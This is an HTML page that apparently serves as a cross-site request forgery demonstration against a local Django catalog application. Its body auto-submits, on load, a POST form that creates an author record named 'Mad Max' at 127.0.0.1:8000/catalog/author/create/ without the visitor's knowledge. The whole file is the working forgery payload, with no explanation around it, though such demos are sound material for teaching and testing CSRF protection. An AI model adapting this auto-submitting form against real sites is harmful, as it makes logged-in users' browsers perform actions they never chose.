<html>

  <body onload="document.EvilForm.submit()">

    <form action="http://127.0.0.1:8000/catalog/author/create/" method="POST" name="EvilForm">

      <label for="id_first_name" class=" requiredField">
        First name<span class="asteriskField">*</span> </label>
      <div class=""> <input type="text" name="first_name" value="Mad" maxlength="100"
          class="textinput textInput form-control" required id="id_first_name"> </div>

      <label for="id_last_name" class=" requiredField">
        Last name<span class="asteriskField">*</span> </label>
      <div class=""> <input type="text" name="last_name" value="Max" maxlength="100"
          class="textinput textInput form-control" required id="id_last_name"> </div>

      <label for="id_date_of_birth" class="">
        Date of birth
      </label>
      <div class=""> <input type="text" name="date_of_birth" class="dateinput form-control" id="id_date_of_birth">

      </div>
      <label for="id_date_of_death" class="">
        Died
      </label>
      <div class=""> <input type="text" name="date_of_death" value="01/01/2020" class="dateinput form-control"
          id="id_date_of_death"> </div>

      <input type="submit" value="Submit">
    </form>

  </body>

</html>
